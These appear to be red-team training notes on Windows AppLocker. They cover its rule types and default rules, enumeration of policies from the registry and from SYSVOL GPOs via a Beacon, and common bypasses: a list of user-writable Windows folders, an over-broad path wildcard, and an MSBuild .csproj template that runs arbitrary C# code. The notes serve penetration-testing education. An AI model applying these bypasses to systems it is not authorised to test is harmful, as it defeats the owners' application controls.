
AppLocker is an application control technology that is built into Windows.  Its aim is to prevent users from running applications, scripts, or packages that are not approved by policy.  A policy contains one or more enforcement rules, where each rule contains a **permission** and a **condition**.  A permission defines the action (allow or deny), and the user or group to which the rule will apply.  A condition defines the rule itself that the policy will apply.  This can be based on:

- **Publisher** - create a rule based on the publisher of a signed application.
    
- **Path** - create a rule based on a file or folder path.
    
- **File hash** - create a rule based on the hash of a file.
    

These policies are defined by system administrators and typically deployed to computers via GPO or Intune, etc.  Windows provides a default set of AppLocker rules which look something like this:

- #### Executable Rules
    
    These rules are for executable files such as `.exe` and `.com`.
    
    - Allow | Everyone | Path | %PROGRAMFILES%\*
        
    - Allow | Everyone | Path | %WINDIR%\*
        
    - Allow | BUILTIN\Administrators | Path | *
        
    
- #### Windows Installer Rules
    
    These rules are for installer files such as `.msi`, `.msp`, and `.mst`.
    
    - Allow | Everyone | Publisher | *
        
    - Allow | Everyone | Path | %WINDIR%\Installer\*
        
    - Allow | BUILTIN\Administrators | Path | *.*
        
    
- #### Script Rules
    
    These are script files such as `.ps1`, `.bat`, `.cmd`, `.vbs`, and `.js`.
    
    - Allow | Everyone | Path | %PROGRAMFILES%\*
        
    - Allow | Everyone | Path | %WINDIR%\*
        
    - Allow | BUILTIN\Administrators | Path | *
        
    
- #### Packaged App Rules
    
    These are for `.appx` packaged applications.
    
    - Allow | Everyone | Publisher | *
        
    

These rules can be deployed as-is, or tweaked based on business requirements.  Attempting to run an application that is not permitted will result in an error like the following:

![[Pasted image 20250729092918.png]]

### Enumeration

AppLocker policies can be enumerated from two locations: directly from the GPO, or from the local registry of a computer to which they're applied.  Enumerating the policy is practically essential for finding a potential bypass.

#### Registry

Enumerating AppLocker policies from the local registry is useful in scenarios where you already have console access to a protected machine.  They are stored in `HKLM\Software\Policies\Microsoft\Windows\SrpV2` with each policy type in their own respective subkey.  You can read them manually by just querying the registry, where each rule is stored as an XML string.

```powershell
PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2

Name                           Property
----                           --------
Appx                           EnforcementMode : 1
                               AllowWindows    : 0
Dll                            AllowWindows : 0
Exe                            EnforcementMode : 1
                               AllowWindows    : 0
Msi                            EnforcementMode : 1
                               AllowWindows    : 0
Script                         EnforcementMode : 1
                               AllowWindows    : 0

PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe

Name                           Property
----                           --------
921cc481-6e17-4653-8f75-050b80 Value : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule)
acca20                         All files located in the Program
                                       Files folder" Description="Allows members of the Everyone group to run
                               applications that are located in the
                                       Program Files folder." UserOrGroupSid="S-1-1-0"
                               Action="Allow"><Conditions><FilePathCondition
                                       Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
a61c8b2c-a319-4cd0-9690-d2177c Value : <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule)
ad7b51                         All files located in the Windows
                                       folder" Description="Allows members of the Everyone group to run applications
                               that are located in the Windows
                                       folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
                                       Path="%WINDIR%\*"/></Conditions></FilePathRule>
```


You can also use the native AppLocker cmdlet, [Get-AppLockerPolicy](https://learn.microsoft.com/en-us/powershell/module/applocker/get-applockerpolicy?view=windowsserver2025-ps), which parses the rules in a more readable manner.

```powershell
PS C:\Users\pchilds> $policy = Get-AppLockerPolicy -Effective
PS C:\Users\pchilds> $policy.RuleCollections

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

#### GPO

Enumerating AppLocker policies from the GPO is useful in scenarios where you already have a Beacon running on an unprotected machine, but you're trying to move laterally to a protected machine.  Your best bet for finding the correct GPO is to enumerate them all and go based on their names.  Alternatively, you can walk through each container in SYSVOL (e.g. `\\contoso.com\SYSVOL\contoso.com\Policies`) and look for `Registry.pol` files in the **Machine** directory.

```powershell
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath

--------------------
displayName: AppLocker
gPCFileSysPath: \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}
--------------------

beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/29/2025 10:47:29   Microsoft
          dir     03/29/2025 10:47:27   Scripts
 8kb      fil     03/29/2025 10:48:02   Registry.pol

beacon> download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
[*] started download of \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol (8216 bytes)
[*] download of Registry.pol is complete
```

Once sync'd to your desktop, the file can be read using the `Parse-PolFile` cmdlet from the [GpRegistryPolicy](https://www.powershellgallery.com/packages/GPRegistryPolicy/0.3) module.

```powershell
PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol

KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 736
ValueData   : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule) All files located in the
              Program Files folder" Description="Allows members of the Everyone group to run applications that are
              located in the Program Files folder." UserOrGroupSid="S-1-1-0"
              Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
```

### Bypasses

Finding an AppLocker bypass is obviously dependant on the policy itself, but here are some common ones to look for:

#### Path Wildcards

You may find instances where a custom rule has been added that allows execution from a directory, but where that rule has overly permissive wildcards.  An example of such as rule could look something like this:

```xml
<FilePathRule Id="daecf627-c762-4c7d-849a-7eb9d4e9692e" Name="App-V" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
	<Conditions>
		<FilePathCondition Path="*\App-V\*"/>
	</Conditions>
</FilePathRule>
```

We can see that the start of the path is not specific to a directory such as `%PROGRAMFILES%` or `%WINDIR%`.  This means that an executable in any directory called _App-V_ will be allowed to run per this rule.

#### Writable Directories

There are multiple directories that exist within the default allowed path for many of the rules, `%WINDIR%\*`, that standard users are allowed to write to.  Simply drop an executable, script, or installer into one of these locations, and it will be allowed to run.  You can find these with tools such as `Get-Acl` and `icacls`.  Such paths include:

- C:\Windows\Tasks
    
- C:\Windows\Temp 
    
- C:\windows\tracing
    
- C:\Windows\System32\spool\PRINTERS
    
- C:\Windows\System32\spool\SERVERS
    
- C:\Windows\System32\spool\drivers\color

![[Pasted image 20250729093500.png]]

#### LOLBAS

Some [LOLBAS](https://lolbas-project.github.io/)' that are able to execute arbitrary code can also be used to bypass AppLocker, because they exist in whitelisted locations such as `%WINDIR%\*`.  [MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/) is one example that allows you to execute arbitrary C# code from a specially crafted `.csproj` file.

```c#
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuild/>
  </Target>
   <UsingTask
    TaskName="MSBuild"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Reference Include="System.Windows.Forms" />		
      <Code Type="Class" Language="cs">
        <![CDATA[
		using Microsoft.Build.Utilities;
		using System.Windows.Forms;

		public class MSBuild : Task
		{
			public override bool Execute()
			{
				MessageBox.Show("Hello World", "AppLocker Bypass");
				return true;
			}
		}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

![[Pasted image 20250729093601.png]]

### PowerShell CLM

AppLocker will also change PowerShell's language mode from _FullLanguage_ to _ConstrainedLanguage_.  This is designed to restrict access to language features that can invoke arbitrary Windows APIs, including a bunch of .NET APIs.

```powershell
PS C:\Users\pchilds> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

PS C:\Users\pchilds> [System.Console]::WriteLine("Hello World")
Cannot invoke method. Method invocation is supported only on core types in this language mode.
```